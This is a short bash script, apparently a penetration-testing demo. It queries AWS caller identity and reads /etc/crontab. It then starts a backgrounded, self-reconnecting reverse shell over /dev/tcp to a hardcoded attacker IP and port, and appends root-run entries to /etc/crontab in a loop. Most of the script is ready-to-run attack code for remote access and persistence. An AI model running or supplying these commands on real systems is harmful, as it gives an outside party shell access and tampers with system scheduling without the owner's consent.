#!/bin/bash


# Example 1: Check AWS identity
echo "Running AWS STS get-caller-identity..."
aws sts get-caller-identity

# Example 2: Run reverse shell command
echo "Executing reverse shell command (Caution: Potentially unsafe)..."
# Replace <ATTACKER-IP> and <PORT> with appropriate values
ATTACKER_IP="172.24.0.163"
PORT="4444"
nohup bash -c "while true; do bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1; sleep 10; done" &


# Example 3: Display the contents of /etc/crontab
echo "Displaying the contents of /etc/crontab..."
cat /etc/crontab

# Writing content to crontab file
CRON_ENTRY="* * * * * root echo 'Pentest example entry' >> /tmp/pentest-log"

# Loop to repeat the process 10 times
for i in {1..10}
do
    # Append the entry to /etc/crontab
    echo "$CRON_ENTRY" >> /etc/crontab
    echo "Added entry to /etc/crontab (Iteration $i)"
    
    # Wait for 3 seconds before the next iteration
    sleep 3
done
